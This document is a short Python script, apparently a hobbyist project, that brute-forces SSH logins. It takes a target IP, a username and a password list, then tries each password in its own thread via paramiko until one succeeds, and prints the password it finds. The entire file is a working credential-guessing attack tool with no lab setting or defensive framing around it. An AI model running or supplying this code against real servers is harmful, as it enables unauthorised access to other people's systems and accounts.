import termcolor, sys, os, paramiko, socket
import threading, time

print("------------| PROJECT - 2 | THREADED SSH BRUTEFORCER | BY TANISH CHOUDHARY |------------")

# INPUT REQUIRED CREDS
host = input("[-|-] ENTER IP [-|-] :  ")  # Target Address
username = input("[-|-] SSH USERNAME [-|-] : ")  # SSH Username
input_file = input("[-|-] PASSWORD FILE [-|-] : ")  # Passwords File
print('\n')

# FILE PATH VERIFICATION
if not os.path.exists(input_file):
    print("[-|-] FILE/PATH WRONG OR NOT EXIST")  # Checks if the file path exists or not
    sys.exit(1)

# Thread Lock to prevent race conditions with output
output_lock = threading.Lock()

# SSH BRUTEFORCE
def ssh_connect(password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # Connecting SSH
        ssh.connect(host, port=22, username=username, password=password)
        with output_lock:
            print(termcolor.colored(f"[+|+] PASSWORD FOUND : {password} FOR USERNAME : {username}", 'green'))
        return True
    except paramiko.AuthenticationException:
        # Incorrect password, print to the terminal
        with output_lock:
            print(f"[-|-] INCORRECT LOGIN WITH : {password}")
        return False  # Incorrect password
    except socket.error:
        with output_lock:
            print("[-|-] CONNECTION CLOSED")
        sys.exit(1)
    finally:
        ssh.close()

# THREAD WORKER
def thread_worker(password):
    if ssh_connect(password):
        global stop_threads
        stop_threads = True

# Reading and creating threads for passwords
def start_bruteforce():
    global stop_threads
    stop_threads = False

    # Read passwords from the file
    with open(input_file, 'r') as file:
        threads = []
        for line in file.readlines():
            if stop_threads:
                break
            password = line.strip()  # Strip each password
            
            # Create a new thread for each password attempt
            thread = threading.Thread(target=thread_worker, args=(password,))
            threads.append(thread)
            thread.start()

        # Join threads to ensure they complete before exiting
        for thread in threads:
            thread.join()

# Start the brute force attempt using threads
start_bruteforce()

